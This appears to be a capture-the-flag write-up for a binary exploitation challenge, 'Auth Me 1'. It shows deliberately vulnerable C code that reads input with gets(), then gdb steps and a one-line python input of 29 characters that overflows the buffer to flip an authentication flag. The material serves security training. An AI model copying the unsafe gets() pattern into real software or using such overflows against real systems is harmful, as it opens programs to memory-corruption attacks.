# Binary Exploitation

Challenge Name : Auth Me 1

# Solution

Use the webshell and go to the directory stated in the challenge's description

![[Pasted image 20210610163036.png]]

Before we run let's analyze the source code first.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64
 
char flag[FLAGSIZE_MAX];
   
void setup(){
  FILE *f = fopen("flag.txt","r");
  fgets(flag,FLAGSIZE_MAX,f);
  gid_t gid = getegid();                                                                                                                                                                        
  setresgid(gid, gid, gid);                                                                                                                                                                     
}                                                                                        
int main(int argc, char **argv){
  setup();                                                                                                                                                                                      
  int authed = 0;
  char user[16];
  printf("Authenticate Me 1.0\n");
  printf("--------------------------------\n");
  printf("Enter your username: ");
  gets(user);                                                                                                                                                                                   
  // Haven't implement login function yet
  if(authed){
    printf("Welcome admin! Here is your flag: %s",flag);
  }else{
    printf("Good Bye %s\n",user);
  }                                                                                                                                                                                             
  return 0;
}

```

We found out that it use `gets()` but how can we change `authed` value to 1? Since we can do buffer overflow we might be able to change the value of the variable to other values. Lets save the code as `auth.c` and compile it first.

```bash
gcc auth.c -o auth -fno-stack-protector
```

Then run it .

```bash
gdb ./auth
```

Set a breakpoint to the value if statement or with the line of `cmp`.

```bash
b *0x00005555555548b2
```

![[Pasted image 20210610170033.png]]

We know that user has `16` size so if we added another `8` bytes it should be 24 . Try inrease it one by one until you are able to change the value of what its comparing to something else. To check the value of what it comparing use this command:

```bash
x/w $rbp-0x4
```

This is the value when we put normal value .

![[Pasted image 20210610170438.png]]

This is the value when we put `29` characters of `a`.

![[Pasted image 20210610170550.png]]

`61` is equivalent to `a` if we convert it from hex. So we can get flag because if statement will check if there is value other than 0 it will become true. So we just need to run this ro get our flag

```bash
python3 -c "print('a' * 29)" | ./auth ;echo
```

# Flag

![[Pasted image 20210610170826.png]]



